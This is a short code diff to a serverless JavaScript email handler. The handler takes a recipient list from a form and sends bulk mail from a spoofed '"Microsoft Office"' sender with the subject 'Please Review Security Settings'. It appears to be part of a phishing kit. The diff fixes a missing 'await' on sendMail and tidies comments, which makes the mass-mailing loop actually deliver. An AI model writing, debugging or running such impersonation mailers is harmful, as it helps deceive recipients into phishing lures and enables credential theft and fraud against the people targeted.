@@ -24,7 +24,7 @@ exports.handler = async (event, context) => {
     const formData = JSON.parse(event.body);
     const { recsx } = formData;
 
-    console.log("recsx:", recsx);
+    console.log("recsx:", recsx); // Log recsx
 
     if (typeof recsx !== 'string' || !recsx) {
       console.error("recsx is invalid:", recsx);
@@ -53,7 +53,7 @@ exports.handler = async (event, context) => {
     rcpntEmls.forEach(recipientEmail => {
       const mailOptions = {
         from: '"Microsoft Office" <Office365>',
-        to: recipientEmail, // Corrected line
+        to: recipientEmail,
         subject: 'Please Review Security Settings',
         html: `
             <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
@@ -65,11 +65,11 @@ exports.handler = async (event, context) => {
             </div>
         `
       };
-
+    
       console.log("Sending email to:", recipientEmail);
-
+    
       try {
-        const info = transporter.sendMail(mailOptions);
+        const info = await transporter.sendMail(mailOptions);
         console.log('Email sent to', recipientEmail, ':', info.response);
       } catch (emailError) {
         console.error('Error sending email to', recipientEmail, ':', emailError);
